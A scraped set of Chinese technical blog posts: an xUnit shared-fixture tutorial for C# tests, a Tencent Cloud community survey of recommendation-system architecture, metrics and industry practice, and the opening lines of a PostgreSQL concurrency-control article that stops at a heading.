public class DatabaseFixture : IDisposable
{
    public DatabaseFixture()
    {
        Db = new SqlConnection("MyConnectionString");

        // ... initialize data in the test database ...
    }

    public void Dispose()
    {
        // ... clean up test data from the database ...
    }

    public SqlConnection Db { get; private set; }
}

public class MyDatabaseTests : IClassFixture<DatabaseFixture>
{
    DatabaseFixture fixture;

    public MyDatabaseTests(DatabaseFixture fixture)
    {
        this.fixture = fixture;
    }


    [Fact]
    public async Task GetTest()
    {
        // ... write tests, using fixture.Db to get access to the SQL Server ...
        // ... 在这里使用注入 的 DatabaseFixture
    }
}
Singleton Sample
这里以一个对 Controller 测试的测试为例

自定义 Fixture
    /// <summary>
    /// A test fixture which hosts the target project (project we wish to test) in an in-memory server.
    /// </summary>
    public class TestStartupFixture : IDisposable
    {
        private readonly IWebHost _server;
        public IServiceProvider Services { get; }

        public HttpClient Client { get; }

        public string ServiceBaseUrl { get; }

        public TestStartupFixture()
        {
            var builder = WebHost.CreateDefaultBuilder()
                .UseUrls($"http://localhost:{GetRandomPort()}")
                .UseStartup<TestStartup>();

            _server = builder.Build();
            _server.Start();

            var url = _server.ServerFeatures.Get<IServerAddressesFeature>().Addresses.First();
            Services = _server.Services;
            ServiceBaseUrl = $"{url}/api/";

            Client = new HttpClient()
            {
                BaseAddress = new Uri(ServiceBaseUrl)
            };

            Initialize();
        }

        /// <summary>
        /// TestDataInitialize
        /// </summary>
        private void Initialize()
        {
            // ...
        }

        public void Dispose()
        {
            Client.Dispose();
            _server.Dispose();
        }

        private static readonly Random Random = new Random();

        private static int GetRandomPort()
        {
            var activePorts = IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners().Select(_ => _.Port).ToList();

            var randomPort = Random.Next(10000, 65535);

            while (activePorts.Contains(randomPort))
            {
                randomPort = Random.Next(10000, 65535);
            }

            return randomPort;
        }
    }
自定义Collection
    [CollectionDefinition("TestCollection")]
    public class TestCollection : ICollectionFixture<TestStartupFixture>
    {
    }
自定义一个 TestBase
    [Collection("TestCollection")]
    public class ControllerTestBase
    {
        protected readonly HttpClient Client;
        protected readonly IServiceProvider ServiceProvider;

        public ControllerTestBase(TestStartupFixture fixture)
        {
            Client = fixture.Client;
            ServiceProvider = fixture.Services;
        }
    }
需要依赖注入的Test类写法

    public class AttendancesTest : ControllerTestBase
    {
        public AttendancesTest(TestStartupFixture fixture) : base(fixture)
        {
        }

        [Fact]
        public async Task GetAttendances()
        {
            var response = await Client.GetAsync("attendances");
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);

            response = await Client.GetAsync("attendances?type=1");
            Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        }
    }
Reference

https://xunit.github.io/docs/shared-context.html

Contact
如果您有什么问题，欢迎随时联系我
Contact me: weihanli@outlook.com

********************************************************************************************************************************************************************************************************
学习这篇总结后，你也能做出头条一样的推荐系统
欢迎大家前往腾讯云+社区，获取更多腾讯海量技术实践干货哦~

本文由jj发表于云+社区专栏

一、推荐系统概述
1.1 概述
推荐系统目前几乎无处不在，主流的app都基本应用到了推荐系统。例如，旅游出行，携程、去哪儿等都会给你推荐机票、酒店等等；点外卖，饿了么、美团等会给你推荐饭店；购物的时候，京东、淘宝、亚马逊等会给你推荐“可能喜欢”的物品；看新闻，今日头条、腾讯新闻等都会给你推送你感兴趣的新闻....几乎所有的app应用或网站都存在推荐系统。
究其根本的原因，推荐系统的流行是因为要去解决一个问题：物品越来越多，信息越来越多，而人的精力和时间是有限的，需要一个方式去更有效率地获取信息，链接人与信息。
推荐系统就是为了解决这一问题而诞生的，在海量的物品和人之间，架起来一条桥梁。它就像一个私人的专属导购，根据你的历史行为、个人信息等等，为每个人diy进行推荐，千人前面，帮助人们更好、更快地选择自己感兴趣的、自己需要的东西。今日头条系的feed流在推荐算法的加持下，短短几年的用户增长速度和使用时长数据令人咂舌，受到了市场的追捧和高估值。一夜之间，几乎所有的app都开始上feed流、上各种推荐，重要性可见一斑。
1.2 基本架构
我们先把推荐系统简单来看，那么它可以简化为如下的架构。
图1 推荐系统一般流程
不管是复杂还是简单的推荐系统，基本都包含流程：

1）结果展示部分。不管是app还是网页上，会有ui界面用于展示推荐列表。
2）行为日志部分。用户的各种行为会被时刻记录并被上传到后台的日志系统，例如点击行为、购买行为、地理位置等等。这些数据后续一般会被进行ETL（extract抽取、transform转换、load加载），供迭代生成新模型进行预测。
3）特征工程部分。得到用户的行为数据、物品的特征、场景数据等等，需要人工或自动地去从原始数据中抽取出特征。这些特征作为输入，为后面各类推荐算法提供数据。特征选取很重要，错的特征必定带来错误的结果。
4）召回部分。 有了用户的画像，然后利用数据工程和算法的方式，从千万级的产品中锁定特定的候选集合，完成对推荐列表的初步筛选，其在一定程度上决定了排序阶段的效率和推荐结果的优劣。
5）排序部分。针对上一步的候选集合，会进行更精细化地打分、排序，同时考虑新颖性、惊喜度、商业利益等的一系列指标，获得一份最终的推荐列表并进行展示。

完整的推荐系统还会包括很多辅助模块，例如线下训练模块，让算法研究人员利用真实的历史数据，测试各类不同算法，初步验证算法优劣。线下测试效果不错的算法就会被放到线上测试，即常用的A/B test系统。它利用流量分发系统筛选特定的用户展示待测试算法生成的推荐列表，然后收集这批特定用户行为数据进行线上评测。
图2 蘑菇街推荐系统架构
推荐系统每个部分可大可小，从图2可知，各部分涉及的技术栈也较多。终端app每时每刻都在不断上报各类日志，点击、展示、时间、地理位置等等信息，这些海量信息需要依赖大数据相关软件栈支持，例如Kafka、spark、HDFS、Hive等，其中Kafka常被用于处理海量日志上报的消费问题。将数据进行ETL后存入Hive数据仓库，就可进行各类线上、线下测试使用。线下的算法会上线到线上环境进行ABtest，ABtest涉及完整的测试回路打通，不然拿不到结果，也无法快速开发迭代算法。线上推荐系统还要关注实时特征、离线特征，在性能和各类指标、商业目标间取均衡。
1.3 评测指标
一个东西做得好还是不好，能不能优化，首要前提是确定评测指标。只有确定了评测指标，才能有优化的方向。评测推荐系统的指标可以考虑以下几个方面：
1.3.1 用户满意度
用户作为推进系统的主要参与者，其满意度是评测系统的最重要指标。满意度可以通过做用户调查或线上实验获得。在在线系统中，一般通过对用户行为的统计得到，例如点击率、用户停留时间和转化率等指标度量用户的满意度。
1.3.2 预测精确度precision
预测准确度度量一个推荐系统或者推荐算法预测用户行为的能力。这个指标是最重要的离线评测指标。由于离线数据可计算，绝大部分科研人员都在讨论这个指标。
评分预测问题一般使用RMSE、MAE等，TopN预测问题一般使用Recall、Precision等。
图3 常见的指标准确率(Precision)、召回率(Recall)、误检率
其实目前国内很多地方和资料混淆了两个指标的叫法，把准确度对应英文precision指标。不过尽量还是用英文比较好。
准确度Accuracy = (TP + TN) / (TP + FP + TN + FN)
精确度Precision=TP/(TP+FP)
1.3.3 覆盖率coverage
覆盖率描述一个推荐系统对物品长尾的发掘能力。覆盖率有很多定义方法，最简单的计算就是推荐列表中的物品数量，除以所有的物品数量。
在信息论和经济学中有两个著名的指标用来定义覆盖率，一个是信息熵，一个是基尼系数。具体公式和介绍可以google。
ps：长尾在推荐系统中是个常见的名词。举个例子帮助大家理解，在商店里，由于货架和场地有限，摆在最显眼的地方的物品通常是出名的、热门的，从而销量也是最好的。很多不出名或者小知名度的商品由于在货架角落或者根本上不了货架，这些商品销量很差。在互联网时代，这一现象会被打破。电子商城拥有几乎无限长的“货架”，它可以为用户展现很多满足他小众需求的商品，这样总的销量加起来将远远超过之前的模式。
Google是一个最典型的“长尾”公司，其成长历程就是把广告商和出版商的“长尾”商业化的过程。数以百万计的小企业和个人，此前他们从未打过广告，或从没大规模地打过广告。他们小得让广告商不屑一顾，甚至连他们自己都不曾想过可以打广告。但Google的AdSense把广告这一门槛降下来了：广告不再高不可攀，它是自助的，价廉的，谁都可以做的；另一方面，对成千上万的Blog站点和小规模的商业网站来说，在自己的站点放上广告已成举手之劳。Google目前有一半的生意来自这些小网站而不是搜索结果中放置的广告。数以百万计的中小企业代表了一个巨大的长尾广告市场。这条长尾能有多长，恐怕谁也无法预知。无数的小数积累在一起就是一个不可估量的大数，无数的小生意集合在一起就是一个不可限量的大市场。
图4 长尾曲线
1.3.4多样性
用户的兴趣是多样的，推荐系统需要能覆盖用户各种方面的喜好。这里有个假设，如果推荐列表比较多样，覆盖了用户各种各样的兴趣，那么真实命中用户的兴趣概率也会越大，那么就会增加用户找到自己感兴趣的物品的概率。
1.3.5 新颖性
新颖的推荐是指给用户推荐那些他们以前没有听说过的物品。要准确地统计新颖性需要做用户调查。
1.3.6 惊喜度
如果推荐结果和用户的历史兴趣不相似，但却让用户觉得满意，那么就可以说推荐结果的惊喜度很高，而推荐的新颖性仅仅取决于用户是否听说过这个推荐结果。
1.3.7 信任度
用户对推荐系统的信任程度。如果用户信任推荐系统，那就会增加用户和推荐系统的交互。特别是在电子商务推荐系统中，让用户对推荐结果产生信任是非常重要的。同样的推荐结果，以让用户信任的方式推荐给用户就更能让用户产生购买欲，而以类似广告形式的方法推荐给用户就可能很难让用户产生购买的意愿。提高推荐系统的信任度主要有两种方法。首先需要增加推荐系统的透明度（transparency），而增加推荐系统透明度的主要办法是提供推荐解释。其次是考虑用户的社交网络信息，利用用户的好友信息给用户做推荐，并且用好友进行推荐解释。
1.3.8 实时性
在很多网站中，因为物品（新闻、微博等）具有很强的时效性，所以需要在物品还具有时效性时就将它们推荐给用户。因此，在这些网站中，推荐系统的实时性就显得至关重要。
推荐系统的实时性包括两个方面。首先，推荐系统需要实时地更新推荐列表来满足用户新的行为变化。实时性的第二个方面是推荐系统需要能够将新加入系统的物品推荐给用户。这主要考验了推荐系统处理物品冷启动的能力。
1.3.9 健壮性
衡量了一个推荐系统抗击作弊的能力。算法健壮性的评测主要利用模拟攻击。首先，给定一个数据集和一个算法，可以用这个算法给这个数据集中的用户生成推荐列表。然后，用常用的攻击方法向数据集中注入噪声数据，然后利用算法在注入噪声后的数据集上再次给用户生成推荐列表。最后，通过比较攻击前后推荐列表的相似度评测算法的健壮性。如果攻击后的推荐列表相对于攻击前没有发生大的变化，就说明算法比较健壮。
1.3.10 商业目标
很多时候，评测推荐系统更加注重商业目标是否达成，而商业目标和盈利模式是息息相关的。一般来说，最本质的商业目标就是平均一个用户给公司带来的盈利。不过这种指标不是很难计算，只是计算一次需要比较大的代价。因此，很多公司会根据自己的盈利模式设计不同的商业目标。
1.3.11 参考资料
推荐系统的评测问题有很多的相关研究和资料，预详细研究可阅读参考：

《推荐系统实战》
《Evaluating Recommendation Systems》
What metrics are used for evaluating recommender systems?

二、常用算法
推荐算法的演化可以简单分为3个阶段，也是推荐系统由简单到复杂的迭代。
2.1 推荐算法演化
2.1.1 人工运营
这个阶段是随机的，人工根据运营目的，手工给特定类别的用户推送特定的内容。
优点是：

方便推广特定的内容；
推荐的内容易解释；

缺点是：

千人一面，推送的内容一样；
人工筛选，推送，耗费人力巨大；
运营根据自己的知识，主观性比较大；

2.1.2 基于统计的推荐
会基于一些简单的统计学知识做推荐，例如某个内别卖得最好的热门榜；再细致一些，将用户按个人特质划分，再求各种热度榜等。
优点是：

热门就是大部分用户喜好的拟合，效果好；
推荐的内容易解释；

缺点是：

千人一面，推送的内容一样；
马太效应，热门的会越来越热门，冷门的越来越冷门；
效果很容易达到天花板；

2.1.3 个性化推荐
当前阶段的推荐，会基于协同过滤算法、基于模型的算法、基于社交关系等，机器学习、深度学习逐渐引入，提高了推荐效果。
优点是：

效果要相对于之前，要好很多；
千人前面，每个人都有自己独特的推荐列表；

缺点是：

门槛较高，推荐系统搭建、算法设计、调优等等，都对开发者有较高的要求；
成本较高，而且是个长期迭代优化的过程，人力物力投入很高；

2.2 推荐算法汇总
内部一个分享这样分类常用的推荐算法：
图5 推荐算法分类
这里提到的Memory-based算法和Model-based算法的差别是什么？这也是我之前关注的问题，找到个资料，讲解得比较透彻。
Memory-based techniques use the data (likes, votes, clicks, etc) that you have to establish correlations (similarities?) between either users (Collaborative Filtering) or items (Content-Based Recommendation) to recommend an item i to a user u who’s never seen it before. In the case of collaborative filtering, we get the recommendations from items seen by the user’s who are closest to u, hence the term collaborative. In contrast, content-based recommendation tries to compare items using their characteristics (movie genre, actors, book’s publisher or author… etc) to recommend similar new items.
In a nutshell, memory-based techniques rely heavily on simple similarity measures (Cosine similarity, Pearson correlation, Jaccard coefficient… etc) to match similar people or items together. If we have a huge matrix with users on one dimension and items on the other, with the cells containing votes or likes, then memory-based techniques use similarity measures on two vectors (rows or columns) of such a matrix to generate a number representing similarity.
Model-based techniques on the other hand try to further fill out this matrix. They tackle the task of “guessing” how much a user will like an item that they did not encounter before. For that they utilize several machine learning algorithms to train on the vector of items for a specific user, then they can build a model that can predict the user’s rating for a new item that has just been added to the system.
Since I’ll be working on news recommendations, the latter technique sounds much more interesting. Particularly since news items emerge very quickly (and disappear also very quickly), it makes sense that the system develops some smart way of detecting when a new piece of news will be interesting to the user even before other users see/rate it.
Popular model-based techniques are Bayesian Networks, Singular Value Decomposition, and Probabilistic Latent Semantic Analysis (or Probabilistic Latent Semantic Indexing). For some reason, all model-based techniques do not enjoy particularly happy-sounding names.

《携程个性化推荐算法实践》一文中梳理了工业界应用的排序模型，大致经历三个阶段：
图6 排序模型演进
本文不对上面的这些算法进行详细的原理探讨，会比较复杂，有兴趣可以再自行学习。
2.3 CF算法示例
为了学习这块的技术知识，跟着参加了下内部举办的srtc推荐比赛。重在参与，主要是学习整个基本流程，体会下推荐场景，了解腾讯内部做得好的团队和产品是什么样子。
2.3.1（内部敏感资料，删除）
2.3.2 CF算法
在web平台上点一点，可能失去了学习的意义。所以本着学习的态度，我在线下自己的机器上实现了一些常用的算法，例如CF等。
推荐算法里CF算是比较常见的，核心还是很简单的。

user-cf基本原理

A.找到和目标用户兴趣相似的的用户集合； B.找到这个集合中的用户喜欢的，且目标用户没听过的物品推荐给目标用户。

item-cf基本原理

A.计算物品之间的相似度； B.根据物品的相似度和用户的历史行为给用户生成推荐列表。
结合前面总结的，cf属于memory-base的算法，很大一个特征就是会用到相似度的函数。这个user-cf需要计算用户兴趣的相似度，item-cf需要计算物品间的相似度。基于相似度函数的选择、编程语言的选择、实现方式的选择、优化的不同，结果和整个运行时间会很大不同。当时就简单用python实现的，8个process跑满cpu同时处理，需要近10个小时跑完。后面了解到有底层进行过优化的pandas、numpy等，基于这些工具来实现速度会快很多。
2.3.3 收获
哈哈，第一次参加这种比赛，虽然成绩很差，但自己觉得很是学到很多东西，基本达到了参赛的目的。在真实的场景和数据下去思考各种影响因素，体会各种算法从设计、实现、训练、评价等各阶段，很多东西确实比看资料和书来得更深入。果然实践才是学习的最好手段。如果想更深入去搞推荐算法这块，感觉需要继续学习目前各种热门算法的原理、潜规则，kaggle上多练手，以及锻炼相关的平台及工程化能力。
三、业界推荐系统调研
收集、研究了下网上一些推荐系统落地总结的文章，可以开拓视野，加深整体理解。
以下只是一些重要内容，有兴趣可以阅读原文：

《今日头条算法原理》，原文链接
《推荐算法在闲鱼小商品池的探索与实践》，原文链接
《饿了么推荐系统：从0到1》，原文链接
《爱奇艺个性化推荐排序实践》，原文链接
《携程个性化推荐算法实践》，原文链接
《蘑菇街推荐工程实践》，原文链接

3.1 今日头条推荐系统
今日头条算法架构师曹欢欢博士，做过一次 《今日头条算法原理》的报告。主要涉及4部分：系统概览、内容分析、用户标签、评估分析。

四类典型推荐特征


第一类是相关性特征，就是评估内容的属性和与用户是否匹配。 第二类是环境特征，包括地理位置、时间。这些既是bias特征，也能以此构建一些匹配特征。 第三类是热度特征。包括全局热度、分类热度，主题热度，以及关键词热度等。 第四类是协同特征，它可以在部分程度上帮助解决所谓算法越推越窄的问题。

模型的训练上，头条系大部分推荐产品采用实时训练


模型的训练上，头条系大部分推荐产品采用实时训练。实时训练省资源并且反馈快，这对信息流产品非常重要。用户需要行为信息可以被模型快速捕捉并反馈至下一刷的推荐效果。我们线上目前基于storm集群实时处理样本数据，包括点击、展现、收藏、分享等动作类型。模型参数服务器是内部开发的一套高性能的系统，因为头条数据规模增长太快，类似的开源系统稳定性和性能无法满足，而我们自研的系统底层做了很多针对性的优化，提供了完善运维工具，更适配现有的业务场景。
目前，头条的推荐算法模型在世界范围内也是比较大的，包含几百亿原始特征和数十亿向量特征。整体的训练过程是线上服务器记录实时特征，导入到Kafka文件队列中，然后进一步导入Storm集群消费Kafka数据，客户端回传推荐的label构造训练样本，随后根据最新样本进行在线训练更新模型参数，最终线上模型得到更新。这个过程中主要的延迟在用户的动作反馈延时，因为文章推荐后用户不一定马上看，不考虑这部分时间，整个系统是几乎实时的。

但因为头条目前的内容量非常大，加上小视频内容有千万级别，推荐系统不可能所有内容全部由模型预估。所以需要设计一些召回策略，每次推荐时从海量内容中筛选出千级别的内容库。召回策略最重要的要求是性能要极致，一般超时不能超过50毫秒。

用户标签工程挑战更大


内容分析和用户标签是推荐系统的两大基石。内容分析涉及到机器学习的内容多一些，相比而言，用户标签工程挑战更大。 今日头条常用的用户标签包括用户感兴趣的类别和主题、关键词、来源、基于兴趣的用户聚类以及各种垂直兴趣特征（车型，体育球队，股票等）。还有性别、年龄、地点等信息。性别信息通过用户第三方社交账号登录得到。年龄信息通常由模型预测，通过机型、阅读时间分布等预估。常驻地点来自用户授权访问位置信息，在位置信息的基础上通过传统聚类的方法拿到常驻点。常驻点结合其他信息，可以推测用户的工作地点、出差地点、旅游地点。这些用户标签非常有助于推荐。

当然最简单的用户标签是浏览过的内容标签。但这里涉及到一些数据处理策略。主要包括：一、过滤噪声。通过停留时间短的点击，过滤标题党。二、热点惩罚。对用户在一些热门文章（如前段时间PG One的新闻）上的动作做降权处理。理论上，传播范围较大的内容，置信度会下降。三、时间衰减。用户兴趣会发生偏移，因此策略更偏向新的用户行为。因此，随着用户动作的增加，老的特征权重会随时间衰减，新动作贡献的特征权重会更大。四、惩罚展现。如果一篇推荐给用户的文章没有被点击，相关特征（类别，关键词，来源）权重会被惩罚。当然同时，也要考虑全局背景，是不是相关内容推送比较多，以及相关的关闭和dislike信号等。

Hadoop集群压力过大，上线 Storm集群流式计算系统


面对这些挑战。2014年底今日头条上线了用户标签Storm集群流式计算系统。改成流式之后，只要有用户动作更新就更新标签，CPU代价比较小，可以节省80%的CPU时间，大大降低了计算资源开销。同时，只需几十台机器就可以支撑每天数千万用户的兴趣模型更新，并且特征更新速度非常快，基本可以做到准实时。这套系统从上线一直使用至今。

很多公司算法做的不好，并非是工程师能力不够，而是需要一个强大的实验平台，还有便捷的实验分析工具


A/B test系统原理

这是头条A/B Test实验系统的基本原理。首先我们会做在离线状态下做好用户分桶，然后线上分配实验流量，将桶里用户打上标签，分给实验组。举个例子，开一个10%流量的实验，两个实验组各5%，一个5%是基线，策略和线上大盘一样，另外一个是新的策略。

实验过程中用户动作会被搜集，基本上是准实时，每小时都可以看到。但因为小时数据有波动，通常是以天为时间节点来看。动作搜集后会有日志处理、分布式统计、写入数据库，非常便捷。
3.2 推荐算法在闲鱼小商品池的探索与实践

闲鱼中个性化推荐流程


商品个性化推荐算法主要包含Match和Rank两个阶段：Match阶段也称为商品召回阶段，在推荐系统中用户对商品的行为称为用户Trigger，通过长期收集用户作用在商品上的行为，建立用户行为和商品的矩阵称为X2I，最后通过用户的Trigger和关系矩阵X2I进行商品召回。Rank阶段利用不同指标的目标函数对商品进行打分，根据推荐系统的规则对商品的多个维度进行综合排序。下面以闲鱼的首页feeds为例，简单介绍闲鱼的个性化推荐流程。
所示步骤1.1，利用用户的信息获取用户Trigger，用户信息包括用户的唯一标识userId，用户的设备信息唯一标识uttid。
所示步骤1.2，返回用户Trigger其中包括用户的点击、购买过的商品、喜欢的类目、用户的标签、常逛的店铺、购物车中的商品、喜欢的品牌等。
所示步骤1.3，进行商品召回，利用Trigger和X2I矩阵进行join完成对商品的召回。
所示步骤1.4，返回召回的商品列表，在商品召回中一般以I2I关系矩阵召回的商品为主，其他X2I关系矩阵召回为辅助。
步骤2.1，进行商品过滤，对召回商品进行去重，过滤购买过的商品，剔除过度曝光的商品。
所示步骤2.2，进行商品打分，打分阶段利用itemInfo和不同算法指标对商品多个维度打分。
步骤2.3，进行商品排序，根据规则对商品多个维度的分数进行综合排序。
步骤2.4，进行返回列表截断，截断TopN商品返回给用户。
闲鱼通过以上Match和Rank两个阶段八个步骤完成商品的推荐，同时从图中可以看出为了支持商品的个性化推荐，需要对X2I、itemInfo、userTrigger数据回流到搜索引擎，这些数据包含天级别回流数据和小时级别回流数据。

小商品的特点

小商品池存在以下几个特点。
实时性：在闲鱼搭建的小商品池中要求商品可以实时的流入到该规则下的商品池，为用户提供最新的优质商品。
周期性：在小商品池中，很多商品拥有周期属性，例如免费送的拍卖场景，拍卖周期为6小时，超过6小时后将被下架。
目前频道导购页面大多还是利用搜索引擎把商品呈现给用户，为了保证商品的曝光，一般利用搜索的时间窗口在商品池中对商品进一步筛选，但是仍存在商品曝光的问题，如果时间窗口过大，那么将会造成商品过度曝光，如果商品窗口过小那么就会造成商品曝光不足，同时还存在一个搜索无法解决的问题，同一时刻每个用户看到的商品都是相同的，无法针对用户进行个性化推荐，为了进一步提升对用户的服务，小商品池亟需引入个性化推荐。

推荐在小商品池的解决方案

在上文中利用全站X2I数据对小商品池的商品进行推荐过程中，发现在Match阶段，当小商品池过小时会造成商品召回不足的问题，为了提升小商品池推荐过程中有效召回数量，提出了如下三种解决方案。
提前过滤法：数据回流到搜索引擎前，小商品池对数据进行过滤，产生小商品池的回流数据，在商品进行召回阶段，利用小商品池的X2I进行商品召回，以此提升商品的召回率。

商品向量化法： 在Match阶段利用向量相似性进行商品召回，商品向量化是利用向量搜索的能力，把商品的特性和规则通过函数映射成商品向量，同时把用户的Trigger和规则映射成用户向量，文本转换向量常用词袋模型和机器学习方法，词袋模型在文本长度较短时可以很好的把文本用词向量标识，但是文本长度过长时受限于词袋大小，如果词袋过小效果将会很差，机器学习的方法是利用Word2Vector把文本训练成向量，根据经验值向量维度一般为200维时效果较好。然后利用向量搜索引擎，根据用户向量搜索出相似商品向量，以此作为召回的商品。如图5所示商品的向量分两部分，前20位代表该商品的规则，后200位代表商品的基本特征信息。

商品搜索引擎法： 在Match阶段利用商品搜索引擎对商品进行召回，如图6所示在商品进入搜索引擎时，对商品结构进行理解，在商品引擎中加入Tag和规则，然后根据用户的Trigger和规则作为搜索条件，利用搜索引擎完成商品的召回。搜索引擎的天然实时性解决了小商品池推荐强实时性的问题。

3.3 饿了么推荐系统：从0到1
对于任何一个外部请求, 系统都会构建一个QueryInfo(查询请求), 同时从各种数据源提取UserInfo(用户信息)、ShopInfo(商户信息)、FoodInfo(食物信息)以及ABTest配置信息等, 然后调用Ranker排序。以下是排序的基本流程(如下图所示)：
#调取RankerManager, 初始化排序器Ranker：

根据ABTest配置信息, 构建排序器Ranker；

调取ScorerManger, 指定所需打分器Scorer(可以多个); 同时, Scorer会从ModelManager获取对应Model, 并校验；

调取FeatureManager, 指定及校验Scorer所需特征Features。

#调取InstanceBuilder, 汇总所有打分器Scorer的特征, 计算对应排序项EntityInfo(餐厅/食物)排序所需特征Features；
#对EntityInfo进行打分, 并按需对Records进行排序。

这里需要说明的是：任何一个模型Model都必须以打分器Scorer形式展示或者被调用。主要是基于以下几点考虑：

模型迭代：比如同一个Model，根据时间、地点、数据抽样等衍生出多个版本Version；

模型参数：比如组合模式(见下一小节)时的权重与轮次设定，模型是否支持并行化等；

特征参数：特征Feature计算参数，比如距离在不同城市具有不同的分段参数。

3.4 爱奇艺个性化推荐排序实践
我们的推荐系统主要分为两个阶段，召回阶段和排序阶段。
召回阶段根据用户的兴趣和历史行为，同千万级的视频库中挑选出一个小的候选集（几百到几千个视频）。这些候选都是用户感兴趣的内容，排序阶段在此基础上进行更精准的计算，能够给每一个视频进行精确打分，进而从成千上万的候选中选出用户最感兴趣的少量高质量内容（十几个视频）。

推荐系统的整体结构如图所示，各个模块的作用如下：
用户画像：包含用户的人群属性、历史行为、兴趣内容和偏好倾向等多维度的分析，是个性化的基石
特征工程：包含了了视频的类别属性，内容分析，人群偏好和统计特征等全方位的描绘和度量，是视频内容和质量分析的基础
召回算法：包含了多个通道的召回模型，比如协同过滤，主题模型，内容召回和SNS等通道，能够从视频库中选出多样性的偏好内容
排序模型：对多个召回通道的内容进行同一个打分排序，选出最优的少量结果。
除了这些之外推荐系统还兼顾了推荐结果的多样性，新鲜度，逼格和惊喜度等多个维度，更能够满足用户多样性的需求。
然后，介绍了推荐排序系统架构、推荐机器学习排序算法演进。
3.5 携程个性化推荐算法实践
推荐流程大体上可以分为3个部分，召回、排序、推荐结果生成，整体的架构如下图所示。

召回阶段，主要是利用数据工程和算法的方式，从千万级的产品中锁定特定的候选集合，完成对产品的初步筛选，其在一定程度上决定了排序阶段的效率和推荐结果的优劣。
业内比较传统的算法，主要是CF[1][2]、基于统计的Contextual推荐和LBS，但近期来深度学习被广泛引入，算法性取得较大的提升，如：2015年Netflix和Gravity R&D Inc提出的利用RNN的Session-based推荐[5]，2016年Recsys上提出的结合CNN和PMF应用于Context-aware推荐[10]，2016年Google提出的将DNN作为MF的推广，可以很容易地将任意连续和分类特征添加到模型中[9]，2017年IJCAI会议中提出的利用LSTM进行序列推荐[6]。2017年携程个性化团队在AAAI会议上提出的深度模型aSDAE，通过将附加的side information集成到输入中，可以改善数据稀疏和冷启动问题[4]。
对于召回阶段得到的候选集，会对其进行更加复杂和精确的打分与重排序，进而得到一个更小的用户可能感兴趣的产品列表。携程的推荐排序并不单纯追求点击率或者转化率，还需要考虑距离控制，产品质量控制等因素。相比适用于搜索排序，文本相关性检索等领域的pairwise和listwise方法，pointwise方法可以通过叠加其他控制项进行干预，适用于多目标优化问题。
工业界的推荐方法经历从线性模型＋大量人工特征工程[11] -> 复杂非线性模型-> 深度学习的发展。Microsoft首先于2007年提出采用Logistic Regression来预估搜索广告的点击率[12]，并于同年提出OWLQN优化算法用于求解带L1正则的LR问题[13]，之后于2010年提出基于L2正则的在线学习版本Ad Predictor[14]。
Google在2013年提出基于L1正则化的LR优化算法FTRL-Proximal[15]。2010年提出的Factorization Machine算法[17]和进一步2014年提出的Filed-aware Factorization Machine[18]旨在解决稀疏数据下的特征组合问题，从而避免采用LR时需要的大量人工特征组合工作。
阿里于2011年提出Mixture of Logistic Regression直接在原始空间学习特征之间的非线性关系[19]。Facebook于2014年提出采用GBDT做自动特征组合，同时融合Logistic Regression[20]。
近年来，深度学习也被成功应用于推荐排序领域。Google在2016年提出wide and deep learning方法[21]，综合模型的记忆和泛化能力。进一步华为提出DeepFM[15]模型用于替换wdl中的人工特征组合部分。阿里在2017年将attention机制引入，提出Deep Interest Network[23]。
携程在实践相应的模型中积累了一定的经验，无论是最常用的逻辑回归模型（Logistic Regression），树模型（GBDT，Random Forest）[16]，因子分解机（FactorizationMachine），以及近期提出的wdl模型。同时，我们认为即使在深度学习大行其道的今下，精细化的特征工程仍然是不可或缺的。
基于排序后的列表，在综合考虑多样性、新颖性、Exploit & Explore等因素后，生成最终的推荐结果。
四、总结
之前没有接触过推荐系统，现在由于工作需要开始接触这块内容。很多概念和技术不懂，需要补很多东西。近期也去参加了内部推荐大赛真实地操作了一轮，同时开始学习推荐系统的基础知识，相关架构等，为下一步工作打下必要的基础。
推荐系统是能在几乎所有产品中存在的载体，它几乎可以无延时地以用户需求为导向，来满足用户。其代表的意义和效率，远远超过传统模式。毋庸置疑，牛逼的推荐系统就是未来。但这里有个难点就在于，推荐系统是否做得足够的好。而从目前来看，推荐算法和推荐系统并没有达到人们的预期。因为人的需求是极难猜测的。
又想到之前知乎看到一篇文章，说的是国内很多互联网公司都有的运营岗位，在国外是没有专设这个岗位的。还记得作者分析的较突出原因就是：外国人比较规矩，生活和饮食较单调，例如高兴了都点披萨。而中国不一样，从千千万万的菜品就能管中窥豹，国人的爱好极其广泛，众口难调。加上国外人工时很贵，那么利用算法去拟合用户的爱好和需求，自动地去挖掘用户需求，进行下一步的深耕和推荐就是一个替代方案。这也是国外很推崇推荐系统的侧面原因。而在中国，人相对来说是便宜的，加上国人的口味更多更刁钻，算法表现不好，所以会设很多专门的运营岗位。但慢慢也开始意识到这将是一个趋势，加上最近ai大热，各家大厂都在这块不断深耕。
回到推荐系统上，从现实中客观的原因就可以看到，真正能拟合出用户的需求和爱好确实是很困难的事情。甚至有时候用户都不知道自己想要的是啥，作为中国人，没有主见和想法是正常的，太有主见是违背标准答案的。但推荐系统背后代表的意义是：你的产品知道用户的兴趣，能满足用户的兴趣，那么必定用户就会离不开你。用户离不开的产品，肯定会占领市场，肯定就有极高的估值和想象空间。这也就是大家都在做推荐系统，虽然用起来傻傻的，效果也差强人意，依然愿意大力投入的根本原因。
几句胡诌，前期学习过后的简单总结，自己还有很多东西和细节需要继续学习和研究。能力有限，文中不妥之处还请指正~
（ps：文中一些截图和文字的版权归属原作者，且均已标注引用资料来源地址，本文只是学习总结之用，如有侵权，联系我删除）

问答
推荐系统如何实现精准推荐？
相关阅读
推荐系统基础知识储备
量化评估推荐系统效果
基于用户画像的实时异步化视频推荐系统
【每日课程推荐】机器学习实战！快速入门在线广告业务及CTR相应知识

此文已由作者授权腾讯云+社区发布，更多原文请点击
搜索关注公众号「云加社区」，第一时间获取技术干货，关注后回复1024 送你一份技术课程大礼包！
海量技术实践经验，尽在云加社区！

********************************************************************************************************************************************************************************************************
浅析Postgres中的并发控制(Concurrency Control)与事务特性(下)
上文我们讨论了PostgreSQL的MVCC相关的基础知识以及实现机制。关于PostgreSQL中的MVCC，我们只讲了元组可见性的问题，还剩下两个问题没讲。一个是"Lost Update"问题，另一个是PostgreSQL中的序列化快照隔离机制(SSI，Serializable Snapshot Isolation)。今天我们就来继续讨论。

3.2 Lost Update
